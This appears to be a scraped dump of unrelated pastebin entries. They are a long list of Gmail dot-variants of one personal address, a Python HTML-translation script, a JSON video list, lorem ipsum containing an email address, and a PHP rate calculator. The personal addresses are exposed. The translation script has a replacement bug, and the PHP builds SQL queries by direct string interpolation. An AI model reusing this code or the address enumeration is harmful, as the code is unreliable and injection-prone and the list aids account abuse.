<a href=""mailto:dw9.346.8.4.5@gmail.com"">dw9.346.8.4.5@gmail.com</a>
<a href=""mailto:d.w.93468.4.5@gmail.com"">d.w.93468.4.5@gmail.com</a>
<a href=""mailto:d.w.9.3.46.8.45@gmail.com"">d.w.9.3.46.8.45@gmail.com</a>
<a href=""mailto:d.w9.3.4684.5@gmail.com"">d.w9.3.4684.5@gmail.com</a>
<a href=""mailto:d.w93.4.6.8.45@gmail.com"">d.w93.4.6.8.45@gmail.com</a>
<a href=""mailto:dw.934.68.4.5@gmail.com"">dw.934.68.4.5@gmail.com</a>
<a href=""mailto:d.w.93.4.68.4.5@gmail.com"">d.w.93.4.68.4.5@gmail.com</a>
<a href=""mailto:dw.93.4.68.4.5@gmail.com"">dw.93.4.68.4.5@gmail.com</a>
<a href=""mailto:dw.9.3.4684.5@gmail.com"">dw.9.3.4684.5@gmail.com</a>
<a href=""mailto:d.w.9.34.6.8.45@gmail.com"">d.w.9.34.6.8.45@gmail.com</a>
<a href=""mailto:dw.934.6.84.5@gmail.com"">dw.934.6.84.5@gmail.com</a>
<a href=""mailto:d.w9.3.46.8.4.5@gmail.com"">d.w9.3.46.8.4.5@gmail.com</a>
<a href=""mailto:dw9.3.46.8.4.5@gmail.com"">dw9.3.46.8.4.5@gmail.com</a>
<a href=""mailto:d.w93.4.6.845@gmail.com"">d.w93.4.6.845@gmail.com</a>
<a href=""mailto:d.w.93.4.684.5@gmail.com"">d.w.93.4.684.5@gmail.com</a>
<a href=""mailto:d.w.934.6.845@gmail.com"">d.w.934.6.845@gmail.com</a>
<a href=""mailto:d.w.9346.8.4.5@gmail.com"">d.w.9346.8.4.5@gmail.com</a>
<a href=""mailto:d.w.9.34.68.4.5@gmail.com"">d.w.9.34.68.4.5@gmail.com</a>
<a href=""mailto:d.w93.46.84.5@gmail.com"">d.w93.46.84.5@gmail.com</a>
<a href=""mailto:dw93.4.6.84.5@gmail.com"">dw93.4.6.84.5@gmail.com</a>
<a href=""mailto:d.w9.346845@gmail.com"">d.w9.346845@gmail.com</a>
<a href=""mailto:dw.93.46.845@gmail.com"">dw.93.46.845@gmail.com</a>
<a href=""mailto:d.w9.34.6.8.4.5@gmail.com"">d.w9.34.6.8.4.5@gmail.com</a>
<a href=""mailto:d.w.93.4.68.45@gmail.com"">d.w.93.4.68.45@gmail.com</a>
<a href=""mailto:dw.9.3.468.45@gmail.com"">dw.9.3.468.45@gmail.com</a>
<a href=""mailto:d.w.934.6.8.45@gmail.com"">d.w.934.6.8.45@gmail.com</a>
<a href=""mailto:dw.93.4.6.8.45@gmail.com"">dw.93.4.6.8.45@gmail.com</a>
<a href=""mailto:dw93.468.4.5@gmail.com"">dw93.468.4.5@gmail.com</a>
<a href=""mailto:dw.9.3.46.84.5@gmail.com"">dw.9.3.46.84.5@gmail.com</a>
<a href=""mailto:dw9.346.84.5@gmail.com"">dw9.346.84.5@gmail.com</a>
<a href=""mailto:d.w.9.34.6.845@gmail.com"">d.w.9.34.6.845@gmail.com</a>
<a href=""mailto:d.w9.3.4.684.5@gmail.com"">d.w9.3.4.684.5@gmail.com</a>
<a href=""mailto:d.w.93.468.45@gmail.com"">d.w.93.468.45@gmail.com</a>
<a href=""mailto:d.w.934.6845@gmail.com"">d.w.934.6845@gmail.com</a>
<a href=""mailto:d.w.9.3468.45@gmail.com"">d.w.9.3468.45@gmail.com</a>
<a href=""mailto:d.w.9.34.6.84.5@gmail.com"">d.w.9.34.6.84.5@gmail.com</a>
<a href=""mailto:d.w.9346.8.45@gmail.com"">d.w.9346.8.45@gmail.com</a>
<a href=""mailto:dw.93.4.68.45@gmail.com"">dw.93.4.68.45@gmail.com</a>
<a href=""mailto:d.w934.6845@gmail.com"">d.w934.6845@gmail.com</a>
<a href=""mailto:dw.934.6.8.4.5@gmail.com"">dw.934.6.8.4.5@gmail.com</a>
<a href=""mailto:dw9.34.684.5@gmail.com"">dw9.34.684.5@gmail.com</a>
<a href=""mailto:dw.9.346.84.5@gmail.com"">dw.9.346.84.5@gmail.com</a>
<a href=""mailto:d.w.9.346845@gmail.com"">d.w.9.346845@gmail.com</a>
<a href=""mailto:dw.93.4.6.84.5@gmail.com"">dw.93.4.6.84.5@gmail.com</a>
<a href=""mailto:dw.9.34684.5@gmail.com"">dw.9.34684.5@gmail.com</a>
<a href=""mailto:d.w.93.4.6845@gmail.com"">d.w.93.4.6845@gmail.com</a>
<a href=""mailto:d.w.9346845@gmail.com"">d.w.9346845@gmail.com</a>
<a href=""mailto:d.w.93.4.6.84.5@gmail.com"">d.w.93.4.6.84.5@gmail.com</a>
<a href=""mailto:d.w.9.3.4.6.8.4.5@gmail.com"">d.w.9.3.4.6.8.4.5@gmail.com</a>
<a href=""mailto:dw.9.3.468.4.5@gmail.com"">dw.9.3.468.4.5@gmail.com</a>
<a href=""mailto:dw9346845@gmail.com"">dw9346845@gmail.com</a>
<a href=""mailto:dw.9.3468.4.5@gmail.com"">dw.9.3468.4.5@gmail.com</a>
<a href=""mailto:dw93.4.6845@gmail.com"">dw93.4.6845@gmail.com</a>
<a href=""mailto:d.w.9.3.4.6.845@gmail.com"">d.w.9.3.4.6.845@gmail.com</a>
<a href=""mailto:dw9.3.4.68.45@gmail.com"">dw9.3.4.68.45@gmail.com</a>
<a href=""mailto:dw.934684.5@gmail.com"">dw.934684.5@gmail.com</a>
<a href=""mailto:d.w.9.3.468.45@gmail.com"">d.w.9.3.468.45@gmail.com</a>
<a href=""mailto:dw93.46845@gmail.com"">dw93.46845@gmail.com</a>
<a href=""mailto:d.w.9.3.4.68.45@gmail.com"">d.w.9.3.4.68.45@gmail.com</a>"
6BkzhqiS,new-regex-translate,nicuf,Python,Monday 3rd of July 2023 11:51:43 AM CDT,"import os
import re
from googletrans import Translator

translator = Translator()

# Folder path
folder_path = r""c:\Folder3\2""

# HTML tags to translate
tags_to_translate = ['<title>.*?</title>', '<meta name=""description"" content="".*?"">', '<p class=""text_obisnuit2"">.*?</p>', '<p class=""text_obisnuit"">.*?</p>']

# Words to check
words_to_check = ['the', 'you', 'which', 'view', 'because', 'here', 'have', 'this', 'two', 'one', 'three', 'four', 'five', 'six', 'seven', 'ten', 'had', 'then', 'see', 'saw', 'also', 'than', 'that', 'must', 'make', 'from']

# Iterate over all HTML files in the folder
for filename in os.listdir(folder_path):
    if filename.endswith("".html""):
        with open(os.path.join(folder_path, filename), 'r', encoding='utf-8') as file:
            html_content = file.read()

            # Iterate over all tags to translate
            for tag in tags_to_translate:
                matches = re.findall(tag, html_content, re.DOTALL)

                # Translate each match
                for match in matches:
                    # Check if the match contains at least three of the specified words
                    if sum(word in match for word in words_to_check) >= 3:
                        # Split the match into sentences
                        sentences = re.split(r'(?<=[.!?])\s+', match)

                        # Translate each sentence that contains at least three of the specified words
                        for sentence in sentences:
                            if sum(word in sentence for word in words_to_check) >= 3:
                                translation = translator.translate(sentence, dest='ru').text

                                # Replace the original sentence with the translation in the match
                                match = match.replace(sentence, translation)

                        # Replace the original match with the translated match in the HTML content
                        html_content = html_content.replace(match, translation)

        # Write the translated HTML content back to the file
        with open(os.path.join(folder_path, filename), 'w', encoding='utf-8') as file:
            file.write(html_content)
"
MBxke2ZY,tv 07-2023 task,spidersam,JSON,Monday 3rd of July 2023 11:51:22 AM CDT,"[
  {
    ""name"": ""ZooTv-live-03-07-2023.mp4"",
    ""url"": ""https://hello.freeconference.com/drive_files/download/ec572aff-b838-4a4f-a564-06c8e6623c39.mp4"",
    ""imageUrl"": ""https://i.imgur.com/O8HhNCcm.jpg""
  },
  {
    ""name"": ""ZooTv-03-07-2023.mp4"",
    ""url"": """",
    ""imageUrl"": ""https://i.imgur.com/O8HhNCcm.jpg""
  }
]"
WnWCHyGQ,Lorem,wheresTheAnyKey,Bash,Monday 3rd of July 2023 11:32:53 AM CDT,"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, nina.pimblett@centiveesupport.com also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

"
g226xXux,Hours calculation,BoiBai,PHP,Monday 3rd of July 2023 11:29:14 AM CDT,"$word_count = [224]; //кол-во слов
$project_field = [227]; //получаем проект
$writer_rate = [494]; //получаем рейт писателя
$project_category = [167]; //получаем категорию проекта

//Получаем id проекта
$project_array = db_query(""select field_262 from app_entity_26 where id={$project_field}"");
$project_db = db_fetch_array($project_array);
$project_id = $project_db['field_262'];

//Получаем стоимость заказа по проекту
$rate_array = db_query(""select field_299 from app_entity_27 where id={$project_field}"");
$rate_db = db_fetch_array($rate_array);
$client_rate = $rate_db['field_299'];

//Получаем тип проекта
$type_array = db_query(""select field_584 from app_entity_27 where id={$project_field}"");
$type_db = db_fetch_array($type_array);
$client_type = $type_db['field_584'];
//325 - internal; 326 - client; 327 - outreach; 328 - pbns

/* Project categories
45 - Client Content
375 - Client Content - Discount
374 - Client Content - AI
371 - Sales Copy
87 - Internal Content
341 - Reusable Content
*/

//Calculating by category
if ($project_category == 45) { //45 - Client Content
	$output_value = Round((($word_count * 0.25) / $client_rate),2);
}
else if ($project_category == 375) //375 - Client Content - Discount
{
    $output_value = Round((($word_count * 0.07) / $client_rate),2);
    echo ""word count: "" . $word_count;
    echo "" writers rate: "" . $writer_rate;
    echo "" client rate: "" . $client_rate;
    echo "" output value: "" . $output_value;
}
else if ($project_category == 374) //374 - Client Content - AI
{
    $output_value = Round((($word_count * 0.07) / $client_rate),2);
    //echo ""word count: "" . $word_count;
    //echo "" writers rate: "" . $writer_rate;
    //echo "" client rate: "" . $client_rate;
}
else //all the others
{
    $output_value = Round((($word_count * $writer_rate) / $client_rate),2);
    //echo ""word count: "" . $word_count;
    //echo "" writers rate: "" . $writer_rate;
    //echo "" client rate: "" . $client_rate;
}

//Calculating by client type
/*
if ($client_type == 326) {
	$output_value = Round((($word_count * 0.25) / $client_rate),2);
}
else if ($client_type == 326) 
{
    $output_value = Round((($word_count * $writer_rate) / $client_rate),2);
    //echo ""word count: "" . $word_count;
    //echo "" writers rate: "" . $writer_rate;
    //echo "" client rate: "" . $client_rate;
}
else
{
    $output_value = Round((($word_count * $writer_rate) / $client_rate),2);
    //echo ""word count: "" . $word_count;
    //echo "" writers rate: "" . $writer_rate;
    //echo "" client rate: "" . $client_rate;
}
*/"
